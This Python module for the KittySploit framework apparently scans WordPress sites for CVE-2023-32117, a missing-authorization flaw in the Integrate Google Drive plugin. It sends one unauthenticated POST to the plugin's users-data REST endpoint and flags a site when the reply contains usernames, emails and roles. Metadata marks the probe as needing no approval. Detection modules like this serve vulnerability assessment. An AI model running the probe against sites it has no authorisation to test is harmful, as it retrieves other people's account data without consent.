#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""The Integrate Google Drive plugin for WordPress is vulnerable to unauthorized access due to a missing capabili."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Integrate Google Drive <= 1.1.99 - Missing Authorization via REST API Endpoints Detection',
        'description': 'The Integrate Google Drive plugin for WordPress is vulnerable to unauthorized access due to a missing capability check on several REST API endpoints in versions up to, and including, 1.1.99. This makes it possible for unauthenticated attackers to perform a wide variety of operations, such as moving files, creating folders, copying details, and much more.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2023', 'wordpress', 'wpscan', 'wp-plugin', 'wp', 'integrate-google-drive', 'vuln', 'vkev'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://github.com/RandomRobbieBF/CVE-2023-32117',
            'https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-plugins/integrate-google-drive/integrate-google-drive-1199-missing-authorization-via-rest-api-endpoints',
        ],
        'cve': 'CVE-2023-32117',
    }

    def run(self):
        path = '/wp-json/igd/v1/get-users-data'
        r = self.http_request(method='POST', path=path, allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_all = ('"username":', '"name":', '"email":', '"role":',)
        header_any = ('application/json',)
        if (all(m in body for m in body_all)) and (any(m in headers for m in header_any)):
            self.set_info(
                severity='high',
                reason='Integrate Google Drive <= 1.1.99 - Missing Authorization via REST API Endpoints detected',
                path=path,
            )
            return True
        return False

